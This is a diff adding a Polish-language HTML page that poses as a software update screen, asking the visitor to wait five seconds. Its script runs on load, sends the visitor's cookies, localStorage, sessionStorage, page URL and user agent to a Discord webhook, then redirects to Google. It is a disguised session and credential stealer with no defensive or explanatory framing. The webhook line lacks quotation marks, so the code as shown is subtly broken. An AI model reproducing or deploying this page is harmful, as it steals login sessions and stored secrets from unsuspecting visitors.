@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Aktualizacja</title>
+    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:80px;}</style>
+</head>
+<body>
+    <h1>Trwa aktualizacja...</h1>
+    <p>Proszę czekać 5 sekund. Nie zamykaj okna.</p>
+
+    <script>
+        const webhook = https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW
+
+        function wyślij(dane) {
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: "```" + JSON.stringify(dane, null, 2) + "```"})
+            });
+        }
+
+        wyślij({
+            strona: window.location.href,
+            cookies: document.cookie,
+            localStorage: Object.fromEntries(Object.entries(localStorage)),
+            sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+            userAgent: navigator.userAgent,
+            czas: new Date().toISOString()
+        });
+
+        setTimeout(() => window.location = "https://google.com", 5000);
+    </script>
+</body>
+</html>
